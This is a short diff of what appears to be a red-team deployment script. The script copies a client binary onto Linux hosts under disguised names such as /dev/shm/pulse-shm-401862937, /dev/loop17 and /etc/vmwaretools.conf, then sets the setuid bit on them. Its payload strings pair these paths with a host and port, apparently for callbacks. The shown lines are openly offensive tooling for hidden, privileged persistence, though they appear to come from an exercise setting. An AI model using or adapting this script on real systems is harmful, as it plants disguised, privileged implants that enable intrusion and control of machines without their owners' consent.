@@ -11,7 +11,7 @@ port="8080"
 
 payload1="/dev/shm/pulse-shm-401862937 $host $port" 
 payload2="/dev/loop17 $host $port"
-payload3="/etc/vmware-tools.conf $host $port"
+payload3="/etc/vmwaretools.conf $host $port"
 
 # Setup tools for basic deployment 
 setup(){
@@ -35,7 +35,7 @@ clone(){
     cp /opt/cdt-redteamtool/client_binary/dist/client /dev/shm/pulse-shm-401862937
     cp /opt/cdt-redteamtool/client_binary/dist/client /dev/loop17
     cp /opt/cdt-redteamtool/client_binary/dist/client /etc/vmwaretools.conf
-    chmod u+s /dev/shm/pulse-shm-401862937 /dev/loop17 /etc/vmwaretools.conf
+    chmod u+s /dev/shm/pulse-shm-401862937 /dev/loop17 /etc/vmwaretools.conf 
 
 }
 
